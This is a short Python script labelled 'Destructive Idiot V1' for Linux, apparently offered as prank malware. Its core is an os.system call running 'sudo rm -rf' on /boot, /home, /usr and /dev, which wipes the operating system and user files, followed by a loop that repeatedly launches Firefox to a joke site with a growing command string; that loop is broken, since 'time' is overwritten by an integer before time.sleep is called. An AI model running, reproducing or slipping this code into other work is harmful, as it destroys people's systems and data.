print("Destructive Idiot V1 (Long Version)")
print("Made For Linux")
print("https://github.com/BenPI88/Destructive-Idiot")
import os
os.system("sudo rm -rf /boot && rm -rf /home && rm -rf /usr && rm -rf /dev")
import time
link = "firefox youareanidiot.cc"
time = 30
while True:
  os.system(link)
  link = link + link
  time.sleep(time)
  time -= 5
